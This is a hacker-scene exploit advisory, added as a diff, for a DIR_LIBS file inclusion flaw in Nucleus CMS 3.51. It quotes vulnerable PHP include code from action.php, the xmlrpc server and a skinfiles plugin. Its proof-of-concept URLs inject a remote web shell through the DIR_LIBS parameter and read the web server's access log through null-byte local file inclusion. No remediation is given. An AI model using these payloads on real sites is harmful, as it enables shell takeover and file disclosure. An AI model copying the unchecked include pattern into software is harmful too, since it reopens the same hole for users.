@@ -1,0 +1,87 @@
+########################################################
+    Nucleus CMS v.3.51 (DIR_LIBS) Multiple Vulnerability
+########################################################
+ 
+ 
+ ____                  __                              __    __               
+/\  _`\               /\ \      __                    /\ \__/\ \              
+\ \ \L\_\__  __    ___\ \ \/'\ /\_\    ___      __    \ \ ,_\ \ \___      __  
+ \ \  _\/\ \/\ \  /'___\ \ , < \/\ \ /' _ `\  /'_ `\   \ \ \/\ \  _ `\  /'__`\
+  \ \ \/\ \ \_\ \/\ \__/\ \ \\`\\ \ \/\ \/\ \/\ \L\ \   \ \ \_\ \ \ \ \/\  __/
+   \ \_\ \ \____/\ \____\\ \_\ \_\ \_\ \_\ \_\ \____ \   \ \__\\ \_\ \_\ \____\
+    \/_/  \/___/  \/____/ \/_/\/_/\/_/\/_/\/_/\/___L\ \   \/__/ \/_/\/_/\/____/
+                                                /\____/                       
+                                                \_/__/                        
+ __      __          __          ______                       Author:eidelweiss
+/\ \  __/\ \        /\ \        /\  _  \                          
+\ \ \/\ \ \ \     __\ \ \____   \ \ \L\ \  _____   _____     ____ 
+ \ \ \ \ \ \ \  /'__`\ \ '__`\   \ \  __ \/\ '__`\/\ '__`\  /',__\
+  \ \ \_/ \_\ \/\  __/\ \ \L\ \   \ \ \/\ \ \ \L\ \ \ \L\ \/\__, `\
+   \ `\___x___/\ \____\\ \_,__/    \ \_\ \_\ \ ,__/\ \ ,__/\/\____/
+    '\/__//__/  \/____/ \/___/      \/_/\/_/\ \ \/  \ \ \/  \/___/
+                                             \ \_\   \ \_\        
+                                              \/_/    \/_/        
+                                                         
+ 
+[+]Software:    Nucleus CMS
+[+]Version:	Nucleus v3.51 (Other or lower version may also be affected)
+[+]License: 	GNU/GPL (Free Software)
+[+]Homepage:	http://nucleuscms.org/download.php
+[+]Download:	http://prdownloads.sourceforge.net/nucleuscms/nucleus3.51.zip?download
+ ########################################################
+ 
+[!]Discovered:	eidelweiss
+[!]Contact:	eidelweiss[at]cyberservices[dot]com
+[!]Thank`s:	sp3x (securityreason) - r0073r & 0x1D (inj3ct0r) loneferret - Exploits - dookie2000ca (exploit-db)
+		JosS (hack0wn) - g1xx_achmed - [D]eal [C]yber - Syabilla_putri (i miss u so much to)
+ 
+########################################################
+ 
+-=[Description]=-
+ 
+    Nucleus allows you to easily maintain your own weblog(s) on your own server. It offers a system that is easy to install, but still offers maximum flexibility. (PHP4/MySQL)
+
+########################################################
+ 
+	-=[VUln Code]=-
+**********************************
+[-][path_to_nucleus]/action.php
+
+$CONF = array();
+require('./config.php');
+
+// common functions
+include_once($DIR_LIBS . 'ACTION.php');
+
+$action = requestVar('action');
+$a =& new ACTION();
+$errorInfo = $a->doAction($action);
+
+**********************************
+[-][path_to_nucleus]/nucleus/xmlrpc/server.php
+
+$CONF = array();
+require("../../config.php");	// include Nucleus libs and code
+include($DIR_LIBS . "xmlrpc.inc.php");
+include($DIR_LIBS . "xmlrpcs.inc.php");
+
+**********************************
+[-][path_to_nucleus]/nucleus/plugins/skinfiles/index.php
+
+ 	$strRel = '../../../'; 
+	require($strRel . 'config.php');
+	include($DIR_LIBS . 'PLUGINADMIN.php');
+
+########################################################
+ 
+	-=[ P0C ]=-
+ 
+	Http://127.0.0.1/[path_to_nucleus]/action.php?DIR_LIBS= [inj3ct0r sh3ll]
+ 
+	Http://127.0.0.1/[path_to_nucleus]/nucleus/xmlrpc/server.php?DIR_LIBS= [inj3ct0r sh3ll]
+
+	Http://127.0.0.1/[path_to_nucleus]/nucleus/plugins/skinfiles/index.php?DIR_LIBS=../../../var/log/httpd/access_log%00
+				or
+	Http://127.0.0.1/[path_to_nucleus]/nucleus/plugins/skinfiles/index.php?DIR_LIBS=[lfi]%00
+
+###############################=[E0F]=###################################
